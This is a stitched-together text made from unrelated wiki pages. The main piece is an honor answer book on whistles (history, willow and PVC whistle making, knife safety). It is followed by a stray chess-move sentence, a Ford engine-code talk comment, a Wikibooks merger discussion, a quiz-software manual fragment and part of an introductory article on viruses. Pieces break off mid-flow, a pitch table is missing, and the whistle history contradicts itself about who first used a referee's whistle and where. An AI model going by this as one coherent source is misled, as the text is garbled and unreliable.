Police whistles fell into disuse in many countries in 1969, when early hand-held radios were brought into service. With the rise of the motor car, the whistle was no longer usefully audible in urban areas. The whistle is still used by some police forces today, and engraved ceremonial versions are sometimes presented to police officers upon occasions such as their retirement.

=== Industrial whistles ===

Industrial whistles are used for signalling and timekeeping both on railroad and ships, and in factories.   Most of these whistles were steam powered and not standardized.  Individual locomotives could be identified by their whistles.  At noontime in industrial areas up into the 1950s whistles of every pitch could be heard, as each factory had a boiler and a whistle, if not full steam power.    

=== Safety ===

Whistles are often used as warning devices or as safety devices serving to attract attention to the user. Some cyclists use a whistle as a substitute for a bell or horn. It should be noted, however, that many jurisdictions require that the warning device be permanently attached to the bicycle.

Rescue or survival whistles are often packed in survival kits and attached to personal flotation devices to allow a victim to signal for help. The whistle is audible at much greater distances than the human voice, and is less likely to cause exhaustion if used repeatedly. Survival whistles differ from pea whistles in that they are usually flat, so that water cannot collect inside if the user is immersed, for example after falling overboard from a boat.

Whistles can also produce sounds at pitches inaudible to the human ear such as dog whistles which can be heard by dogs at a range beyond that of human sensory perception, or at least conscious perception.

=== Boats ===

Ship's whistles must be very loud for safety on the seas. Modern ship's whistles can be electrically or steam driven. The RMS Queen Mary was originally equipped with three electric ''Tyfon'' whistles in 1932. They could be heard at least ten miles away and were tuned to 55 Hz, a low bass ''A'' note that was chosen for maximum passenger comfort despite the high sound pressure level. One of the three whistles was taken back to Kockum Sonics in Malmö, Sweden, where it was refurbished for a new life of service aboard the RMS ''Queen Mary 2''. Modern IMO regulations specify ships' whistle frequencies to be in the range 70-200 Hz for vessels that are over 200 meters in length. Traditionally, the lower the frequency, the larger the ship. The ''Queen Mary 2'', being 345 meters long, was given the lowest possible frequency (70 Hz) for her regulation whistles which means she carries both 70 Hz modern whistles and a single vintage 55 Hz whistle.

=== Trains ===

Railroads in particular used elaborate whistle codes for communication both within the train and with other trains.  These methods are maintained today with motor-powered air horns.  Trucks also use air horns, especially since they often have air brakes and so there is already a source of compressed air on board.

Train whistles generally produce three or four different frequencies at the same time to produce a non-major chord that is distinct, loud, and low in pitch.

=== Sporting ===

Whistles are used by referees to officiate sporting matches. The whistle was first used to stop a sports match by William Atack in an 1884 game of rugby in New Zealand. Before that game referees used their voices to control play.

Some sports use different types of whistles, but one used around the world in many sports is the Fox 40, a pealess whistle which creates sound using air pressure only. The Fox 40 is used in basketball, hockey, ice hockey, soccer and numerous other games, as it can be heard easily over the noise of the audience.

Another whistle widely used for sports such as Touch Football, Rugby League and Rugby Union is the Thunderer 58.5 by Acme Whistles. It is a metal whistle containing a cork pea. It is used mainly because of its design that allows the user to create a deep, low-pitch shrill that can be heard from hundreds of meters away.

=== Music ===

[[Image:SambaWhistle.jpg|thumb|A samba whistle with three tones]]
The whistle is used by a leader in samba percussion groups help to catch the percussionist's attention. The traditional samba whistle has three tones, but as the size of the percussion section rose, pealess whistles became more popular due to their high pitch and their loud sound.

The slide Whistle (or swanee whistle) was a common instrument in some types of music and was popular as a musical effect in the early days of radio and television.

Pitch pipes are reed whistles used to help in tuning musical instruments and have been common since the 1850s.

=== Military ===

Whistles were used in various military engagements in the 20th century. They were used primarily to initiate a pre-set plan so that all parts (within earshot) would move simultaneously. For example, officers in the World War I would sometimes blow whistles to signal all troops along a broad stretch of trench to attack at the same time.

=== Others ===

Other whistles include bird calls, game calls, shepherd's whistles, Swiss warblers, Chinese pigeon whistles, Chinese and Japanese kite whistles, cuckoo clocks whistles, communication tube whistles, whistling kettles, whistling tops and various toy whistles.

=== Patents and inventors ===

In 1868 Joseph Hudson of Birmingham], England, made the first whistle ever to be used by a football referee. New Zealand referee William Atack was the world's first to use a whistle to stop a game of sport in 1884. It was used for the first time (allegedly) at a game held at Nottingham Forest, prior to this referees used handkerchiefs to attract players' attention. 

By 1884, Joseph Hudson had perfected his whistles and he released the world's most successful whistle to date, the &quot;Acme Thunderer&quot; (the first ever pea whistle). The whistle has been used as an alarm or attention-getting instrument by all manner of industries, sports and revellers. It continues to sell in great quantities throughout the world.

==2. Explain the importance of conservation in regard to whistle making.==

The Pathfinder motto of &quot;Take nothing but pictures, leave nothing but footprints&quot;, is an important consideration, but obviously you cannot make a whistle without taking some wood. Consider your location carefully for harvesting a twig or two. Try searching for willow bushes in a county road ditch where road crews will have to clear the trees for the safety of drivers and harvest a few before the crews arrive. Maybe you know someone with a hedge that needs trimming ?

Avoid harvesting twigs in any areas sensitive to loss. If your harvesting would disturb nature, look for another location.

==3. What do the seasons of the year have to do with making a willow whistle?==
[[File:Willow whistle.jpg|thumb|200px|Willow Whistle]]
Sap is a liquid that circulates within the sapwood of trees. Sap rises up from the roots. Sap contains water and minerals; in the spring it also contains sugars and stimulates the growth of the tree.

A willow whistle requires the maker to remove the bark from a willow twig in a tube shaped piece. The best (or only) season that this can be done is in the spring when there is more sap rising up the tree. This makes the bark more removable from the twig.

A willow whistle is made by sawing a {{units|15-20 cm|6-8 inch}} branch from a green tree.  It should be about {{units|2cm| 3/4 inch}} in diameter, and it should not have any knots or blemishes along its length.  Cut through the bark near the end opposite the mouth piece with a pocket knife, circling the twig all the way around.  Then lightly bruise the stick by tapping on it with another stick to loosen the bark.  You should be able to slip the bark off after a while.  If you split the bark, you will need to start over.

Put the bark back on the stick and cut a notch near the mouthpiece.  Then slip the bark off again.  Shave off a thin sliver from the wood between the notch and the mouth piece to form an airway.  Then carve out a channel between the notch and the end of the whistle.  Replace the bark again and shape the mouthpiece.  It should look like the picture shown to the right.
&lt;ref&gt;http://blog.makezine.com/archive/2009/05/how-to_make_a_willow_whistle.html?CMP=OTC-0D6B48984890&gt;&lt;/ref&gt;
{{clear}}

==4. Name two (2) trees that make the best whistles and why. List three (3) other trees that can be used to make whistles.==

Willow and Maple trees (especially striped maple, ''Acer pensylvanicum'') are considered the best for making whistles. Willow is often more plentiful than maple, and they grow back very quickly when cut. Some prefer maple because it is straighter and has fewer knots. Maples also grow back quickly if cut from a large stump.

Other trees that can be used for whistle-making include:
;Alder, aspen, and poplar: These species can also be used for making slip-bark whistles.  As with any slip-bark whistle though, they should be made in the spring or early summer when the sap is up.  After that, it's too difficult to slip the bark off the wood.
;Elderberry: Elderberry has a pithy core that can be easily removed.  In this case, the bark is not used as the outer sheath, but rather, the whole twig is.  You must find another piece of wood to fit tightly into the pith and shave off the top edge of it to make the whistle.
;Sumac: If you select a sumac tree, make sure it is not a poison sumac tree (''Rhus vernix'').  All parts of the poison sumac contain the same resin as poison ivy and can cause a person to suffer from an itchy rash.  Poison sumac has white berries.  If the sumac has red berries, it is OK to use and will not cause a rash.

==5. Give a brief description of the following styles of whistles:==
===a. Tube Whistles===
[[File:BobbyPalace.JPG|thumb|left|200px|English Bobby]]
[[File:Polizeipfeife.jpg|thumb|200px|Tube whistle]]
A tube whistle is a small, very loud whistle made of a metal tube closed at one end.  These are most familiar as the whistles carried by the English Bobbies (policemen).  
{{clear}}

===b. Pan Whistles===
[[File:Rondador.jpg|thumb|200px|Pan whistle]]
The pan whistle is an ancient musical instrument based on the principle of the closed tube, consisting usually of five or more pipes of gradually increasing length (and, at times, diameter). The pan whistle (or pan flute) has long been popular as a folk instrument, and is considered the first mouth organ, ancestor of both the pipe organ and the harmonica. The pan flute is named for its association with the rustic Greek god Pan. The pipes of the pan flute are typically made from bamboo or giant cane; other materials used include wood, plastic, and metal.
{{clear}}

===c. Flute Whistles===
[[File:Shinobue and other flutes.jpg|thumb|600px|Flutes from around the world]]
Flute whistles are open at both ends and usually have a series of holes along the length of the tube. The pitch of the flute whistle can be changed by closing one or more of the holes.
{{clear}}

==6. Name five (5) types of modern whistles and their uses.==
;Pea Whistle: Pea whistles are used by referees in many sports.  It is a whistle with a small ball trapped inside which makes a rattling sound as the whistle resonates.
;Transverse Flutes: Transverse flutes are a form of whistle used in modern orchestras.  They are operated by blowing across a hole located on the mouthpiece.
;Tin Whistle: This is another form of musical whistle, but unlike the transverse flute, it is end-blown and has only six holes.  It is an important instrument in Irish folk songs.
;Dog Whistes: Dog whistles are used for training dogs or for commanding them from a distance.  Some of these are too high to be heard by humans, but dogs can hear them (and respond) just fine.
;Slide Whistle: A slide whistle is a whistle whose pitch can be varied by moving a slide.  These are often considered novelty items (because of their use in cartoon sound effects), but also make an appearance in serious works of music in many cultures.

==7. What modern musical instrument is a sophisticated whistle?==
[[File:VariousRecorderFlutes.jpg|thumb|250px|Various Recorders]]The recorder is a woodwind musical instrument of the family known as fipple flutes or internal duct flutes — whistle-like instruments which include the tin whistle and ocarina. The recorder is end-blown and the mouth of the instrument is constricted by a wooden plug, known as a block or fipple.

The recorder was popular from medieval times but declined in the 18th century in favour of orchestral woodwind instruments, such as the flute, oboe, and clarinet. During its heyday, the recorder was traditionally associated with birds, shepherds, miraculous events, funerals, marriages and amorous scenes. Images of recorders can be found in literature and artwork associated with all these. Purcell, Bach, Telemann and Vivaldi used the recorder to suggest shepherds and birds, and the pattern continued into the 20th century.

The recorder was revived in the 20th century, partly in the pursuit of historically informed performance of early music, but also because of its suitability as a simple instrument for teaching music and its appeal to amateur players. Today, it is often thought of as a child's instrument, but there are many excellent virtuosic players who can demonstrate the instrument's full potential as a solo instrument. The sound of the recorder is remarkably clear and sweet, partly because of the lack of upper harmonics and predominance of odd harmonics in the sound.

==8. How does a whistle work?==
The whistle works by causing the smooth flow of air to be split by a narrow blade, sometimes called a fipple, creating a turbulent vortex which causes the air to vibrate. By attaching a resonant chamber to the basic whistle, it may be tuned to a particular note and made louder. The length of the chamber typically defines the resonance frequency.

==9. What is the most common equipment used in making whistles?==
In making a willow whistle, all that is needed is a sharp knife.  A saw is handy too for cutting the branch from the tree, but this can be done with a knife too (just not as effectively).

Other types of whistles are made by finding hollow tubes in nature (such as bamboo joints), or by boring out a chamber with a drill.

==10. Explain the importance of wood grain in whittling a whistle.==
For a slip-bark whistle, straight grain is important because it is easier to remove the bark intact from a piece of wood with straight grain.  Grain becomes non-straight anywhere a branch grows a sub-branch.  The bark will snag on these irregularities, making it difficult, if not impossible to remove.

==11. Why must the size of the holes and chamber be proportional to the amount of airflow?==
A whistle makes a tone as the chamber alternately fills with air and evacuates that air.  This cycle repeats several hundred times per second, and the more times per second it repeats, the higher the pitch.  There are three main factors that affect how often this cycle repeats: the length of the chamber, the size of the opening(s), and the speed of sound.  The speed of sound is (for all intents and purposes) fixed.  If the ratio of these other two factors get too &quot;out of whack&quot; with one another, the flute will no longer make a tone.  If the chamber is too long, the flute will never resonate.  Instead, the air will simply flow through from one end to the other without setting up the fill/exhaust cycles.  If the chamber is too wide, it will not be able to confine the air to make it resonate, and the flute will whisper. &lt;ref&gt;http://www.softcom.net/users/greebo/fltphys.htm&lt;/ref&gt;

==12. How do you tune a whistle?==
A whistle is tuned by changing the volume of the resonant chamber.  This is primarily done by altering the length of the chamber, but altering the diameter will also have an effect.

==13. Demonstrate that you can make a two-handed whistle using your hand and a piece of grass.==
&lt;gallery perrow=2 widths=250 heights=250&gt;
File:Grass whistle 1.JPG|Hold the grass like this...
File:Grass whistle 2.jpg|...and blow through it
&lt;/gallery&gt;
Select a long, wide blade of grass.  Prepare to hold your hands together as if to pray, with the lower portion of the thumbs touching one another, palms together, and with the tips of the thumbs touching.  Lay the grass blade between the lower thumbs as you press them together.  The upper portion of the blade will lie parallel to the thumbs and be pinched together by the thumb tips.  Before pinching the upper portion of the blade, bend the thumbs slightly.  Then pinch the grass blade between the tips of the thumbs (or the index fingers), and extend the thumbs (or index finger), pulling the grass taut.  

This should leave a gap between the knuckles of the thumb, with the blade of grass passing through it.  Place your lips over this gap and blow sharply. This should cause the blade to vibrate and make a loud, screeching whistle.

==14. Demonstrate the technique and try to accomplish a whistle using your hand(s) or fingers.==
&lt;gallery perrow=3 widths=250 heights=250&gt;
File:Hand whistle 1.jpg|Press the tips of the fingers of the right hand together and place them in the left palm...
File:Hand whistle 2.jpg|...wrap the left hand around the right...
File:Hand whistle 3.jpg|...blow downwards through the gap between the thumbs.
&lt;/gallery&gt;
Hold the fingers of the right hand together and bring the tips into a tight circle.  Place them in the web between your left thumb and index finger, enclosing the left hand about the right.  The two thumbs should be parallel to one another and resting on the right index finger.  This should form a cavity with a small gap opening into it between the upper and lower thumb knuckles.  Bend the thumbs slightly and place your lower lip just below the top joint in the thumbs.  Place the upper lip on the top joint and blow downwards into the cavity.  If you're doing it right, it will make a whistling noise very similar to the call of mourning dove or a bob white.  Try to keep the cavity air tight except where your breath enters between the thumbs.  Once you are able to do this, try raising the pinky of your left hand while whistling.  The pitch should rise.  Quickly raising and lowering the pinky repeatedly will cause the whistle to quaver.  Try not to drive anyone crazy with your new-found skill!

==15. Review and demonstrate the proper first aid and safety rules for the usage of a pocketknife.==
=== First Aid ===
{{:Adventist Youth Honors Answer Book/First aid/Bleeding}}&lt;br&gt;
For more first aid information, see the [[Adventist Youth Honors Answer Book/Health and Science/First Aid, Basic|First Aid]] honor.

=== Knife Safety ===
{{:Adventist Youth Honors Answer Book/Camping/Knife safety}}

==16. Know how to sharpen a pocketknife using a whetstone or oil sharpening stone.==

A tool can be sharpened with a whetstone. Most whetstones need to be kept wet when they are in use - some are wet with water and others are wet with oil. Stones with finer grain typically use oil, but you can use water on them as well. The purpose of wetting a whetstone is to allow the steel removed from the blade to float away. The finer the stone, the finer the edge it will make on a tool, but the longer it will take to sharpen it. For this reason, a very dull tool should be sharpened first with a coarser stone, and then with a finer stone. Then it should be kept sharp. You can keep a blade sharp by respecting it - do not chop into the ground with a hatchet, and to not stick a knife blade in the ground either. Dirt is highly abrasive, and a rock will ding the edge very quickly. Close a pocket knife when you are finished using it, and do not allow the business end of a blade to touch anything other than the things you are trying to cut with it.

To sharpen a knife, hold the blade at about a 15° angle and scrape it along a whetstone as if you were trying to shave off a thin layer of the stone. Be sure to sharpen both sides.

==17. Make the following whistles:==
===a. Pan (Tubes) whistle===
A pan flute covering one octave can be made from 1/2&quot; CPVC pipe.  (See the note on other types of pipe such as ABS in the section on the Flute Whistle below).

You will need to cut eight lengths of pipe as precisely as you can.  Any imprecision here will translate to an out-of-tune pan whistle.

|}

Round the top edge of the pipes with wet sandpaper while you hold the pipe under a stream of running water.  This is to keep the dust down.  This is an important precaution against inhaling PVC dust which ''never decays'' and will therefore settle ''permanently'' in the lungs if inhaled.  If you do decide to dry sand, you and everyone in the room should wear a dust mask.

Once you have all the pipes cut to length, glue end caps to the bottom by applying PVC cement to the pipes (not the end caps) and then inserting the pipe into the end cap.  Blow over the tops of the holes to test their tune and tone.

The last step is to mount the pipes.  This can be done by drilling 8 holes into a piece of solid wood and then gluing the pipes into it with epoxy.  You could also bind them together with cane or with string.  However you decide to bind them together, the tops should all be even.

===b. Flute Whistle===
A six-hole transverse flute can be made from a 3/4&quot; (19mm) diameter length of PVC (or CPVC) pipe.  PVC is used for plumbing cold water supply lines, and CPVC is used for hot water supply lines.  Do not use ABS, as it is used for plumbing waste lines, and is therefore not regulated in regard to toxicity.  For the same reason, you should not use plastic electrical conduit.

The pipe itself should be cut to a length of 395 mm (15 9/16 inches).  Try to be as precise as possible.  The next step is to measure the location of the holes to be drilled along its length as listed in the table below.  Be as precise as possible both in the measuring and in the drilling.  Mistakes here will make the flute be off-tune.

The &quot;offset&quot; column indicates the number of degrees to the left by which the hole should be offset.  Most of them are in a straight line, but two of them should be rotated to the left (from the viewpoint of having the mouthpiece in your mouth).  These offsets are not crucial, but they do make fingering easier.

Before drilling, glue an end cap on to the mouth end of the flute by applying PVC cement to the pipe (not to the cap).  Once the glue has set, drill the mouth hole through the end cap.  Then drill the remaining holes.  Run a wooden dowel through the inside of the pipe from the uncapped end to knock off the burrs left from drilling.  If desired, you can sand the outside with wet sandpaper while you hold the pipe under a stream of running water.  See the note on the Pan Flute for precautions against PVC dust.

==18. Learn to play a simple song on each whistle you have made.==
If you are not musically inclined, an easy tune to learn is ''Hot Cross Buns''.  It consists of only three notes (C, D, and E), so the whistle does not need to span an entire octave.  Indeed, any three notes that are separated by a whole step will do, so the whistle doesn't even need to be tuned to C, D, and E.  It could also be F, G, A, or G, A, B, or any combination using flats or sharps as long as each note is a whole step from the previous one.

The song itself is as follows:
{|border=0 align=center
|-
|E  ||D    ||C    ||E  ||D    ||C    
|-
|Hot||cross||buns,||Hot||cross||buns,||
|}
{|border=0 align=center
|C||C||C||C||D||D||D||D
|-
|one||a||pen-||ny, ||two||a||pen-||ny
|}
{|border=0 align=center
|E  ||D    ||C
|-
|Hot||cross||buns
|}
Another possibility is ''Mary Had a Little Lamb'':
{|border=0 align=center
|E  ||D ||C  ||D||E   ||E  ||E
|-
|Ma-||ry||had||a||lit-||tle||lamb
|}

This rarely played slow move does little to give Black any issues. Black can play 2. Nf6 with d5 when the White Bishop is misplaced.

      <comment>/* Wrong */ new section</comment>
      <text xml:space="preserve">maybe i am missing something here........i believe this subject could benefit from some year qualifications.......for example i am the owner of several ford e-series vans 
the chart for light trucks engine codes designate engine code H to be a v8 4.6 liter ......while this information which i have not verified .....may be true for all production after 1996.......it is definitely not correct for producton before late 1996 or 1997.........and isn't verified by the Ford vin tool linked to this page.

        The engine code vin H for 1996 and previous years to 1992 I believe to be the 5.8L efi (351 cubic inch) which is the motor and the vin engine code on the verifiable 1996 E150i own....... and which is verified by the vin code tool linked to from Ford..........

      review of the charts or tables only show this particular engine &quot;windsor&quot; belonging to the 300 horse cobra family........when in reality the four known years and possibly more of the  5.8 liter EFI windsor would apply to all E- and F series light trucks as well as some car application ......everyone knows who knows ford motors that it was the predecessor of the 351W, 351M carbuerated.......The W outlived it's intended replacement the 351C or cleveland a very popular motor with the public but which also had limited years of production just like the 5.8L EFI both having approximately four years I believe......please do correct me wherever I am wrong........i believe the production years on the 351 ci efi windsor 5.8L motor to be 1992 through 1996 and the Cleveland motor early to mid seventies.......personally myself i was never that impressed with the cleveland motors even though they were shorter and lighter and had marine application the actual ci was 335 ........and i owned a windsor in a 1970 xr7 which ate the lunch of clevelands all day long and out lasted them.......not trying to start a controversy with the adamant cleveland motor builders out there ......i believe the canadian motor was also manufactured in the states .....either in michigan or ohio.......the designations of C, W, M,H will tell you which one you have and where they came from.....M actually being a modified windsor......but that is all just ancient history I guess.......but the windsor is still offered as a remanufactured replacement motor today and and is still out there racking up the miles on the highway giving the same service it has for over three decades of proud ford service.

== Wrong ==

I hvae a 95 ford escort that I know is a 1.9L with a J engine code. Here it says J is 1.6L.</text>

==Merger==
A merger has been proposed of this book with the featured book [[Communication Theory]]. I have removed the request for merger, as this books with its 2,500 words has nothing to contribute to the featured book with its 51,000 words. This book--Introduction to Communication Theory--should IMHO be orphaned. --[[User:Dan Polansky|Dan Polansky]] ([[User talk:Dan Polansky|talk]]) 10:29, 11 March 2009 (UTC)</text>

You add an image to a question as part of the question properties, see [[../../About Questions/Adding Questions|Adding Questions]] for more detail or as part of the answer options, see [[Question Writer Manual/About Questions/Question Options|Question Options]]. The images can be in either .gif or .jpg format


If you want quiz takers to be able zoom the image with their mouse, tick the 'Use Image Zooming' checkbox in the Appearance Settings [[../../Quiz Options/Appearance Settings/Jpeg Image Quality|Jpeg Image Quality]].

Flash saved as version 8 will also display a better resolution image, so change the [[../../Quiz Options/Appearance Settings/Publish as Flash Version|Flash Version]] to '8'. Most people have Flash version 9 or better by now so this should not be a problem.

If the images in your quiz are blurry or of a low quality, there's a couple of extra things that can help a lot with image quality if you have the Professional version of the software.

# Most importantly, change the [[../../Quiz Options/Appearance Settings/Jpeg Image Quality|Appearance Settings - Jpeg Image Quality]] to a high value - 100 is the top value. Be careful with this though - the higher this is set, the larger the file size will become.
# You can also force the image to be displayed at its native resolution by switching off the [[../../Quiz Options/Question Options/General Question Properties|Use Image Zooming in General Question Properties]], and then in [[../../Quiz Options/Web Settings|web settings]], switch off 'Maximize Quiz in Browser'.{{clr}}
|}


You will need to republish your quiz after changing any of the options to see the new results.

      <text xml:space="preserve">A '''virus''' is a biological agent that reproduces inside the cells of living hosts. When infected by a virus, a host cell is forced to produce many  thousands of identical copies of the original virus, at an extraordinary rate. Unlike most living things, viruses do not have cells that divide; new viruses are assembled in the infected host cell. Over 2,000 species of viruses have been discovered.

A virus consists of two or three parts: all viruses have genes made from either DNA or RNA, long molecules that carry the genetic information; all have a protein coat that protects these genes; and some have an envelope of fat that surrounds them when they are not within a cell. Viruses vary in shape from the simple helical and icosahedral to more complex structures. Viruses are about 100 times smaller than bacteria, and it would take 30,000 to 750,000 of them, side by side, to stretch to {{convert|1|cm}}.

Viruses spread in many different ways. Plant viruses are often spread from plant to plant by insects and other organisms, known as ''vectors''. Some viruses of animals are spread by blood-sucking insects. Each species of virus relies on a particular method. Whereas viruses such as influenza are spread through the air by people when they cough or sneeze, others such as norovirus, which are transmitted by the faecal-oral route, contaminate hands, food and water. Rotavirus is often spread by direct contact with infected children. HIV is one of several major viruses that are transmitted during sex. The origins of viruses is unclear: some may have evolved from plasmids—pieces of DNA that can move between cells—while others may have evolved from bacteria.

Viral infections often cause disease in humans and animals, however they are usually eliminated by the immune system, conferring lifetime immunity to the host for that virus. Antibiotics have no effect on viruses, but antiviral drugs have been developed to treat life-threatening infections. Vaccines that produce lifelong immunity can prevent some viral infections.

==Origins==
Viruses are found wherever there is life and have probably existed since living cells first evolved. The origin of viruses is unclear because they do not form fossils, so molecular techniques have been the most useful means of hypothesising how they arose. However, these techniques rely on the availability of ancient viral DNA or RNA but most of the viruses that have been preserved and stored in laboratories are less than 90 years old.&lt;ref&gt;Shors. p. 16&lt;/ref&gt;&lt;ref&gt;Topley and Wilson pp. 18–19&lt;/ref&gt; Molecular methods have only been successful in tracing the ancestry of viruses that evolved in the 20th century.&lt;ref&gt;Liu, Y., Nickle, D.C., Shriner, D., Jensen, M.A., Learn, G.H. Jr, Mittler, J.E., Mullins, J.I. (2004) &quot;Molecular clock-like evolution of human immunodeficiency virus type 1&quot;.''Virology''. 10;329(1):101-8, PMID 15476878&lt;/ref&gt;

There are three main theories of the origins of viruses:&lt;ref&gt;Shors pp. 14–16&lt;/ref&gt;&lt;ref&gt;Topley and Wilson pp.11–21&lt;/ref&gt;

*'''Regressive theory''': Viruses may have once been small cells that parasitised larger cells. Over time, genes not required by their parasitism were lost. The bacteria rickettsia and chlamydia are living cells that, like viruses, can reproduce only inside host cells. They lend credence to this theory, as their dependence on parasitism is likely to have caused the loss of genes that enabled them to survive outside a cell.&lt;ref&gt;Topley and Wilson p. 11&lt;/ref&gt;

*'''Cellular origin theory''': Some viruses may have evolved from bits of DNA or RNA that &quot;escaped&quot; from the genes of a larger organism. The escaped DNA could have come from plasmids—pieces of DNA that can move between cells—while others may have evolved from bacteria.&lt;ref&gt;Topley and Wilson pp. 11–12&lt;/ref&gt;

*'''Coevolution theory''': Viruses may have evolved from complex molecules of protein and DNA at the same time as cells first appeared on earth and would have been dependent on cellular life for many millions of years.

==Discovery==
[[Image:HIV-budding-Color cropped.jpg|left|thumbnail|Scanning electron micrograph of HIV-1 viruses, coloured green, budding from a lymphocyte]]
In 1884, the French microbiologist Charles Chamberland invented a filter, (known today as the Chamberland filter or Chamberland-Pasteur filter), that has pores  smaller than bacteria. Thus, he could pass a solution containing bacteria through the filter and completely remove them from the solution.&lt;ref&gt;Shors pp. 76–77&lt;/ref&gt; Russian biologist Dimitri Ivanovski used this filter to study what is now known to be the tobacco mosaic virus. His experiments showed that the crushed leaf extracts of infected tobacco plants are still infectious after filtration.

At the same time several other scientists proved that, although these agents (later called ''viruses'') were different from bacteria, they could still cause disease, and they were about a hundred times smaller than bacteria.  In 1899 The Dutch microbiologist Martinus Beijerinck observed that the agent multiplied only in dividing cells. Having failed to demonstrate its particulate nature he called it a &quot;contagium vivum fluidum&quot; to mean &quot;soluble living germ&quot;.&lt;ref&gt;Topley and Wilson p. 3&lt;/ref&gt; In the early 20th century, English bacteriologist Frederick Twort discovered viruses that infect bacteria,&lt;ref&gt;Shors p. 589&lt;/ref&gt; and French-Canadian microbiologist Félix d'Herelle described viruses that, when added to bacteria growing on agar, would lead to the formation of whole areas of dead bacteria. Counting these dead areas allowed him to calculate the number of viruses in the suspension.&lt;ref&gt;D'Herelle, F. ''Res. Microbiol.'' 2007 Sep;158(7):553–4. Epub 2007 Jul 28. &quot;On an invisible microbe antagonistic toward dysenteric bacilli&quot;: brief note by Mr. F. D'Herelle, presented by Mr. Roux. 1917. PMID 17855060&lt;/ref&gt;

With the invention of electron microscopy in 1931 by the German engineers Ernst Ruska and Max Knoll came the first images of viruses.&lt;ref&gt;From ''Nobel Lectures, Physics 1981-1990'', (1993) Editor-in-Charge Tore Frängsmyr, Editor Gösta Ekspång, World Scientific Publishing Co., Singapore&lt;/ref&gt; In 1935 American biochemist and virologist Wendell Meredith Stanley examined the tobacco mosaic virus and found it to be mostly made from protein.&lt;ref&gt;Stanley, W.M., Loring, H.S., (1936) &quot;The isolation of crystalline tobacco mosaic virus protein from diseased tomato plants&quot; ''Science'', 83, p.85 PMID 17756690 &lt;/ref&gt; A short time later, this virus was separated into protein and RNA parts.&lt;ref&gt;Stanley, W.M., Lauffer, M.A. (1939) &quot;Disintegration of tobacco mosaic virus in urea solutions&quot; ''Science'' 89, pp. 345–347 PMID 17788438&lt;/ref&gt;  A problem for early scientists was that they did not know how to grow viruses without using live animals. The breakthrough came in 1931, when the American pathologist Ernest William Goodpasture grew influenza and several other viruses in fertilised chickens' eggs.&lt;ref&gt; Goodpasture, E.W., Woodruff, A.M., Buddingh, G.J. (1931) &quot;The cultivation of vaccine and other viruses in the chorioallantoic membrane of chick embryos&quot; ''Science'' 74, pp. 371–372 PMID 17810781&lt;/ref&gt; Some viruses could not be grown in chickens' eggs, but this problem was solved in 1949 when John Franklin Enders, Thomas Huckle Weller and Frederick Chapman Robbins grew polio virus in cultures of living animal cells.&lt;ref&gt;Rosen, F.S.(2004) &quot;Isolation of poliovirus—John Enders and the Nobel Prize&quot; ''New England Journal of Medicine'', 351,pp. 1481–83 PMID 15470207&lt;/ref&gt; Over 2,000 species of virus have been discovered.&lt;ref&gt; Shors p. 78&lt;/ref&gt;

==Structure==
 [[Image:Virus stucture simple.png|right|thumb|300px|A simplified diagram of the structure of a virus]]
A virus particle, known as a virion, consists of genes made from DNA or RNA which are surrounded by a protective coat of protein called a capsid.&lt;ref name=&quot;Topley-and-Wilson33-55&quot;&gt;Topley and Wilson pp. 33–55&lt;/ref&gt;  The capsid is made of many smaller, identical protein molecules which are called capsomers. The arrangement of the capsomers can either be icosahedral (20-sided), helical or more complex. There is an inner shell around the DNA or RNA called the nucleocapsid, which is formed by proteins. Some viruses are surrounded by a bubble of lipid (fat) called an envelope.

===Size===
Viruses are among the smallest infectious agents, and most of them can only be seen by electron microscopy. Most viruses cannot be seen by light microscopy (in other words, they are sub-microscopic);  their sizes range from 20 to 300&amp;nbsp;Nanometre. They are so small that it would take 30,000 to 750,000 of them, side by side, to stretch to one cm.&lt;ref name=&quot;Topley-and-Wilson33-55&quot;/&gt;

====Genes====

Genes are made from DNA (deoxyribonucleic acid) and, in many viruses, RNA (ribonucleic acid). The biological information contained in an organism is encoded in its DNA or RNA. Most organisms use DNA, but many viruses  have RNA as their genetic material. The DNA or RNA of viruses consists of either a single strand or a double helix.&lt;ref&gt;Shors  pp. 54–61&lt;/ref&gt;

Viruses reproduce rapidly because they have only a few genes compared to humans who have 20,000–25,000.&lt;ref&gt;International Human Genome Sequencing Consortium (2004) &quot;Finishing the euchromatic sequence of the human genome&quot; ''Nature'' 431, p. 931–945 PMID 15496913&lt;/ref&gt; For example, influenza virus has only eight genes and rotavirus has eleven. These genes encode structural proteins that form the virus particle, or non-structural proteins, that are only found in cells infected by the virus.&lt;ref&gt;Shors p. 73&lt;/ref&gt;

All cells, and many viruses, produce proteins that are enzymes called DNA polymerase and RNA polymerase which make new copies of DNA and RNA. A virus's polymerase enzymes are often much more efficient at making DNA and RNA than the host cell's.&lt;ref&gt;Shors pp. 32–34 &lt;/ref&gt;  However, RNA polymerase enzymes often make mistakes, and this is one of the reasons why RNA viruses often mutate to form new strains.&lt;ref&gt;Shors p. 510 &lt;/ref&gt;

In some species of RNA virus, the genes are not on a continuous molecule of RNA, but are separated. The influenza virus, for example, has eight separate genes made of RNA. When two different strains of influenza virus infect the same cell, these genes can mix and produce new strains of the virus in a process called reassortment.&lt;ref&gt;Shors p. 327&lt;/ref&gt;

====Protein synthesis====

Proteins are essential to life. Cells produce new protein molecules from amino acid building blocks based on information coded in DNA. Each type of protein is a specialist that only performs one function, so if a cell needs to do something new, it must make a new protein. Viruses force the cell to make new proteins that the cell does not need, but are needed for the virus to reproduce. Protein synthesis basically consists of two major steps: transcription and translation.

Transcription is the process where information in DNA, called the genetic code, is used to produce RNA copies called messenger RNA (mRNA). These migrate through the cell and carry the code to ribosomes where it is used to make proteins. This is called translation because the protein's amino acid structure is determined by the mRNA's  code.

Some RNA genes of viruses function directly as mRNA without further modification. For this reason, these viruses are called positive-sense RNA viruses.&lt;ref&gt;Topley and Wilson pp. 75–82&lt;/ref&gt; In other RNA viruses, the  RNA is a complementary copy of mRNA and these viruses rely on the cell's or their own enzyme to make mRNA. These are called negative-sense RNA viruses. In viruses made from DNA, the method of mRNA production is similar to that of the cell. The species of viruses called retroviruses behave completely differently: they have RNA, but inside the host cell a DNA copy of their RNA is made. This DNA is then incorporated into the host's, and copied into mRNA by the cell's normal pathways.&lt;ref&gt;Shors pp. 248–250 &lt;/ref&gt;

==Life-cycle==


[[Image:HepC replication.png|right|thumb|300px|Life-cycle of a typical virus, following infection of a cell by a single virus, hundreds of offspring are released]]
When a virus infects a cell, the virus forces it to make thousands  more viruses. It does this by making the cell copy the virus's  DNA or RNA, making viral proteins, which all assemble to form new virus particles.&lt;ref&gt;Shors pp. 11–12&lt;/ref&gt;

